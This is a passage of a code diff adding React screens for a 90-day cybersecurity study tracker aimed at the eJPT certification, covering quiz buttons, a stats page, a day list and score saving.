+        <button onClick={onQuiz} style={{width:"100%",background:color,color:"#000",border:"none",borderRadius:12,padding:16,fontSize:15,fontWeight:800,cursor:"pointer",fontFamily:"inherit",letterSpacing:"0.02em"}}>
+          {score!==undefined ? "↩ Retake Quiz (10 questions)" : "▶ Take Quiz (10 questions)"}
+        </button>
+        {score!==undefined && <div style={{textAlign:"center",marginTop:8,fontSize:11,color:"#334155"}}>Previous score: {score}/10</div>}
+      </div>
+    </div>
+  );
+}
+
+// ─── STATS SCREEN ─────────────────────────────────────────────────────────────
+function StatsScreen({ data, onBack, onDay }) {
+  const scores = data.scores||{};
+  const completed = Object.keys(scores).length;
+  const earned = Object.values(scores).reduce((a,b)=>a+(b.score||0),0);
+  const possible = completed*10;
+  const pct = possible>0?Math.round((earned/possible)*100):0;
+  const streak = computeStreak(scores);
+
+  const weak = Object.entries(scores).filter(([,v])=>v.score<6).sort((a,b)=>a[1].score-b[1].score);
+
+  return (
+    <div style={{background:"#08090f",minHeight:"100vh",color:"#e2e8f0",fontFamily:"system-ui,sans-serif",maxWidth:480,margin:"0 auto"}}>
+      <div style={{padding:"16px 20px",borderBottom:"1px solid #1a1a2e",display:"flex",alignItems:"center",gap:12}}>
+        <button onClick={onBack} style={{background:"transparent",border:"none",color:"#475569",fontSize:20,cursor:"pointer",padding:0}}>←</button>
+        <div style={{fontSize:16,fontWeight:800,color:"#f1f5f9"}}>My Stats</div>
+      </div>
+
+      <div style={{padding:"20px 20px 40px",overflowY:"auto"}}>
+        <div style={{background:"#0f1019",border:"1px solid #00ff9f20",borderRadius:14,padding:22,marginBottom:14,textAlign:"center"}}>
+          <div style={{fontSize:10,color:"#334155",letterSpacing:"0.14em",marginBottom:8}}>OVERALL KNOWLEDGE</div>
+          <div style={{fontSize:64,fontWeight:800,color:"#00ff9f",letterSpacing:"-4px",lineHeight:1}}>{pct}%</div>
+          <div style={{fontSize:12,color:"#334155",marginTop:8}}>{earned} / {possible} pts · {completed} days quizzed</div>
+          <div style={{background:"#1a1a2e",borderRadius:4,height:6,marginTop:14,overflow:"hidden"}}>
+            <div style={{height:"100%",width:`${pct}%`,background:"linear-gradient(90deg,#00ff9f,#a855f7)",borderRadius:4}}/>
+          </div>
+        </div>
+
+        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:14}}>
+          <div style={{background:"#0f1019",border:"1px solid #1a1a2e",borderRadius:12,padding:16,textAlign:"center"}}>
+            <div style={{fontSize:10,color:"#334155",letterSpacing:"0.1em",marginBottom:4}}>STREAK</div>
+            <div style={{fontSize:34,fontWeight:800,color:"#ff6b35"}}>{streak}🔥</div>
+          </div>
+          <div style={{background:"#0f1019",border:"1px solid #1a1a2e",borderRadius:12,padding:16,textAlign:"center"}}>
+            <div style={{fontSize:10,color:"#334155",letterSpacing:"0.1em",marginBottom:4}}>DAYS DONE</div>
+            <div style={{fontSize:34,fontWeight:800,color:"#38bdf8"}}>{completed}<span style={{fontSize:16,color:"#1e2030"}}>/90</span></div>
+          </div>
+        </div>
+
+        {[1,2,3].map(p=>{
+          const pDays=DAYS.filter(d=>d.phase===p);
+          const pDone=pDays.filter(d=>scores[d.day]);
+          const pEarned=pDone.reduce((a,d)=>a+(scores[d.day]?.score||0),0);
+          const pPct=pDone.length>0?Math.round((pEarned/(pDone.length*10))*100):0;
+          const c=PHASE_COLORS[p];
+          return (
+            <div key={p} style={{background:"#0f1019",border:"1px solid #1a1a2e",borderRadius:12,padding:16,marginBottom:10}}>
+              <div style={{display:"flex",justifyContent:"space-between",marginBottom:8}}>
+                <div style={{fontSize:13,fontWeight:700,color:"#cbd5e1"}}>Phase {p}: {PHASE_NAMES[p]}</div>
+                <div style={{fontSize:13,fontWeight:700,color:c}}>{pPct}%</div>
+              </div>
+              <div style={{background:"#1a1a2e",borderRadius:4,height:4,marginBottom:10,overflow:"hidden"}}>
+                <div style={{height:"100%",width:`${pPct}%`,background:c,borderRadius:4}}/>
+              </div>
+              <div style={{display:"flex",flexWrap:"wrap",gap:4}}>
+                {pDays.map(d=>{
+                  const sc=scores[d.day];
+                  const pctD=sc?Math.round((sc.score/10)*100):0;
+                  return (
+                    <button key={d.day} onClick={()=>onDay(d)} title={`Day ${d.day}: ${d.title}${sc?` — ${sc.score}/10`:""}`} style={{
+                      width:26,height:26,borderRadius:6,
+                      background:sc?(pctD>=80?c+"25":pctD>=50?"#ff6b3520":"#ff4d6d18"):"#13131f",
+                      border:`1px solid ${sc?c+"40":"#1a1a2e"}`,
+                      fontSize:9,color:sc?c:"#2d3748",
+                      display:"flex",alignItems:"center",justifyContent:"center",fontWeight:700,
+                      cursor:"pointer",fontFamily:"inherit"
+                    }}>{sc?sc.score:""}</button>
+                  );
+                })}
+              </div>
+            </div>
+          );
+        })}
+
+        {weak.length>0&&(
+          <div style={{background:"#ff4d6d08",border:"1px solid #ff4d6d20",borderRadius:12,padding:16,marginTop:4}}>
+            <div style={{fontSize:10,color:"#ff4d6d",letterSpacing:"0.12em",marginBottom:12}}>NEEDS REVIEW</div>
+            {weak.slice(0,8).map(([day,v])=>{
+              const d=DAYS[Number(day)-1];
+              return (
+                <button key={day} onClick={()=>onDay(d)} style={{width:"100%",background:"transparent",border:"none",cursor:"pointer",fontFamily:"inherit",textAlign:"left",padding:"8px 0",borderBottom:"1px solid #13131f",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
+                  <div>
+                    <span style={{fontSize:10,color:"#475569",marginRight:8}}>D{day}</span>
+                    <span style={{fontSize:13,color:"#94a3b8"}}>{d?.title}</span>
+                  </div>
+                  <span style={{fontSize:11,color:"#ff4d6d",fontWeight:700}}>{v.score}/10</span>
+                </button>
+              );
+            })}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ─── HOME SCREEN ──────────────────────────────────────────────────────────────
+function HomeScreen({ data, onDay, onStats }) {
+  const scores = data.scores||{};
+  const completed = Object.keys(scores).length;
+  const earned = Object.values(scores).reduce((a,b)=>a+(b.score||0),0);
+  const pct = completed>0?Math.round((earned/(completed*10))*100):0;
+  const streak = computeStreak(scores);
+  const todayNum = data.startDate ? Math.min(Math.max(Math.floor((Date.now()-new Date(data.startDate))/86400000)+1,1),90) : 1;
+  const todayDay = DAYS[todayNum-1];
+  const todayScore = scores[todayNum];
+
+  return (
+    <div style={{background:"#08090f",minHeight:"100vh",color:"#e2e8f0",fontFamily:"system-ui,sans-serif",maxWidth:480,margin:"0 auto"}}>
+      {/* Header */}
+      <div style={{padding:"28px 20px 18px",borderBottom:"1px solid #1a1a2e"}}>
+        <div style={{fontSize:10,color:"#1e2030",letterSpacing:"0.2em",marginBottom:6}}>CYBER GRIND</div>
+        <div style={{fontSize:30,fontWeight:800,color:"#f1f5f9",letterSpacing:"-1px",lineHeight:1}}>90 Days</div>
+        <div style={{fontSize:12,color:"#334155",marginTop:4}}>Zero → eJPT · 1 hr/day</div>
+      </div>
+
+      {/* Stats */}
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:10,padding:"18px 20px 0"}}>
+        {[
+          {label:"STREAK",val:`${streak}🔥`,c:"#ff6b35"},
+          {label:"DONE",val:`${completed}/90`,c:"#38bdf8"},
+          {label:"SCORE",val:`${pct}%`,c:"#00ff9f"},
+        ].map(s=>(
+          <div key={s.label} style={{background:"#0f1019",border:"1px solid #1a1a2e",borderRadius:12,padding:"14px 10px",textAlign:"center"}}>
+            <div style={{fontSize:10,color:"#1e2030",letterSpacing:"0.1em",marginBottom:5}}>{s.label}</div>
+            <div style={{fontSize:20,fontWeight:800,color:s.c}}>{s.val}</div>
+          </div>
+        ))}
+      </div>
+
+      {/* Progress */}
+      <div style={{padding:"14px 20px 0"}}>
+        <div style={{background:"#1a1a2e",borderRadius:4,height:5,overflow:"hidden"}}>
+          <div style={{height:"100%",width:`${(completed/90)*100}%`,background:"linear-gradient(90deg,#00ff9f,#a855f7)",borderRadius:4,transition:"width 0.4s"}}/>
+        </div>
+      </div>
+
+      {/* Today */}
+      <div style={{padding:"18px 20px 0"}}>
+        <div style={{fontSize:10,color:"#1e2030",letterSpacing:"0.12em",marginBottom:10}}>TODAY · DAY {todayNum}</div>
+        {todayDay&&(
+          <button onClick={()=>onDay(todayDay)} style={{width:"100%",background:"#0f1019",border:`1px solid ${todayScore?"#00ff9f25":"#1a1a2e"}`,borderRadius:14,padding:18,textAlign:"left",cursor:"pointer",fontFamily:"inherit"}}>
+            <div style={{fontSize:10,color:PHASE_COLORS[todayDay.phase],letterSpacing:"0.1em",marginBottom:6}}>PHASE {todayDay.phase} · {PHASE_NAMES[todayDay.phase]}</div>
+            <div style={{fontSize:16,fontWeight:800,color:"#f1f5f9",marginBottom:4}}>{todayDay.title}</div>
+            <div style={{fontSize:12,color:"#334155",lineHeight:1.4,marginBottom:14}}>{todayDay.topic}</div>
+            {todayScore
+              ? <div style={{fontSize:13,color:"#00ff9f",fontWeight:700}}>✓ Completed · {todayScore.score}/10</div>
+              : <div style={{background:"#00ff9f",color:"#000",borderRadius:8,padding:"10px 16px",fontSize:13,fontWeight:800,display:"inline-block"}}>▶ Start Today's Quiz</div>
+            }
+          </button>
+        )}
+      </div>
+
+      {/* Day list */}
+      <div style={{padding:"20px 20px 0"}}>
+        <div style={{fontSize:10,color:"#1e2030",letterSpacing:"0.12em",marginBottom:12}}>ALL 90 DAYS</div>
+        <div style={{display:"flex",flexDirection:"column",gap:6}}>
+          {DAYS.map(d=>{
+            const sc=scores[d.day];
+            const isToday=d.day===todayNum;
+            const c=PHASE_COLORS[d.phase];
+            return (
+              <button key={d.day} onClick={()=>onDay(d)} style={{
+                display:"flex",alignItems:"center",gap:14,
+                background: isToday?"#0f1419":sc?"#0c0f0c":"#0b0b13",
+                border:`1px solid ${isToday?c+"60":sc?c+"30":"#1a1a2e"}`,
+                borderRadius:10,padding:"12px 14px",cursor:"pointer",fontFamily:"inherit",textAlign:"left"
+              }}>
+                {/* Day number box */}
+                <div style={{width:36,height:36,borderRadius:8,background:sc?c+"20":isToday?c+"15":"#131320",border:`1px solid ${sc?c+"50":isToday?c+"40":"#1a1a2e"}`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}}>
+                  <span style={{fontSize:11,fontWeight:800,color:sc?c:isToday?c:"#2d3748"}}>{sc?"✓":d.day}</span>
+                </div>
+                {/* Info */}
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{fontSize:13,fontWeight:700,color:sc?"#475569":"#cbd5e1",marginBottom:2,textDecoration:sc?"line-through":"none"}}>{d.title}</div>
+                  <div style={{fontSize:11,color:"#1e2030",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{d.topic}</div>
+                </div>
+                {/* Score or arrow */}
+                <div style={{flexShrink:0}}>
+                  {sc
+                    ? <span style={{fontSize:12,fontWeight:700,color:c}}>{sc.score}/10</span>
+                    : <span style={{fontSize:14,color:"#1e2030"}}>›</span>
+                  }
+                </div>
+              </button>
+            );
+          })}
+        </div>
+      </div>
+
+      {/* Stats button */}
+      <div style={{padding:"20px 20px 36px"}}>
+        <button onClick={onStats} style={{width:"100%",background:"#0f1019",border:"1px solid #1a1a2e",color:"#475569",borderRadius:12,padding:15,fontSize:13,fontWeight:700,cursor:"pointer",fontFamily:"inherit"}}>
+          📊 View Full Stats
+        </button>
+      </div>
+    </div>
+  );
+}
+
+// ─── APP ROOT ─────────────────────────────────────────────────────────────────
+function App() {
+  const [data, setData] = useState(()=>{ const d=load(); return {scores:{},...d}; });
+  const [screen, setScreen] = useState("home");
+  const [activeDay, setActiveDay] = useState(null);
+
+  function saveData(d) { setData(d); save(d); }
+
+  function goDay(day) { setActiveDay(day); setScreen("detail"); }
+
+  function handleQuizComplete(dayNum, score) {
+    const updated = {
+      ...data,
+      startDate: data.startDate||new Date().toISOString(),
+      scores: {...data.scores, [dayNum]:{score,total:10,date:new Date().toISOString()}}
+    };
+    saveData(updated);
+  }
+
+  if (screen==="quiz" && activeDay) {
+    return <QuizScreen day={activeDay} onBack={()=>setScreen("detail")} onComplete={(s)=>handleQuizComplete(activeDay.day,s)}/>;
+  }
+  if (screen==="detail" && activeDay) {
+    return <DayDetail day={activeDay} score={data.scores[activeDay.day]?.score} onBack={()=>setScreen("home")} onQuiz={()=>setScreen("quiz")}/>;
+  }
+  if (screen==="stats") {
+    return <StatsScreen data={data} onBack={()=>setScreen("home")} onDay={(d)=>{ setActiveDay(d); setScreen("detail"); }}/>;
+  }
+  return <HomeScreen data={data} onDay={goDay} onStats={()=>setScreen("stats")}/>;
+}
+
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(React.createElement(App));
+
+  </script>
+</body>
+</html>
